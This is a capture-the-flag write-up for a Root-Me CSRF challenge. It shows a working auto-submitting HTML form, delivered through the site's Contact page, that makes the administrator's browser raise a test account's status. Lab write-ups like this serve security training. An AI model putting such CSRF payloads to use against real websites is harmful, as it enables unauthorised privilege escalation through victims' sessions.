Create an account on the website. Here, we will create a account with test as username, and test as password.

The idea is to use the form on http://challenge01.root-me.org/web-client/ch22/?action=profile to check our status, and gain access to the private section.

If we look into the form, we see that we need to submit a

```
<input type="text" name="username" value="test">
<input type="checkbox" name="status" checked>
```

After reading the documents, we understand that if the admin execute this code:

```
<form id="theForm" method="post" enctype="multipart/form-data" action="http://challenge01.root-me.org/web-client/ch22/?action=profile">
	<input type="text" name="username" value="test">
	<input type="checkbox" name="status" checked>
	<button type="submit">Submit</button>
</form>
<script>document.getElementById("theForm").submit()</script>
```

Then we will gain access. Well, just send this through the "Contact" page.

Go back to the private page, wait patiently a minute, refresh, and get the flag.
